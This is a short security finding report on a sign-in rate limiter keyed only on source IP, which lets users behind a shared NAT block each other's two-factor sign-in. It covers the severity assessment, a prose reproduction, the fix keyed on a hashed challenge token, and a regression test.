**What it gets an attacker.** This is not a brute-force weakening — the challenge token is consumed on redemption and a wrong code calls `registerFailedLogin()`, so guessing the six digits still costs a full password login per attempt and locks the account after five. The reachable effect is availability: anyone behind a shared egress address (an office NAT, a mobile carrier CGNAT, a corporate VPN) can exhaust the shared bucket with five junk submissions per minute and stop every other user on that address from completing sign-in. It also means the provider's own stated design — "Authentication limiters key on address *and* source IP together" — is not what runs on this endpoint, so the limiter will not behave as documented if the endpoint is ever changed.

Reproduced: against the unfixed provider, five junk submissions carrying one challenge token cause a sixth submission carrying a *different* challenge token to return 429. The reviewer's severity assessment is right: this is availability, not brute-force weakening (the challenge is consumed by Cache::pull before the code is checked and a wrong code calls registerFailedLogin), and the reachable harm is one visitor behind an office NAT blocking everyone else there from completing sign-in.

**Fix.** Fixed in the same defineAuthLimiter change: a new identityFor() helper keys on `'challenge:'.hash('sha256', $challenge_token)` when the request carries one, falling back to the address otherwise, so each in-flight sign-in gets its own 5-per-minute budget. Hashed so a limiter key never holds a live credential. Deliberately left the `(string) $request->input('email')` cast on the email branch untouched — another verifier has an open finding on that cast crashing for an array-valued email (ArrayEmailCrashesTheAuthRateLimiterTest, still 5/5 green), and fixing it here would erase their demonstration. Regression test: `one_two_factor_attempt_does_not_consume_another_attempts_budget` in tests/Feature/Identity/AuthRateLimitingTest.php — one challenge exhausts its own budget (429) while a different challenge from the same IP still gets 422.
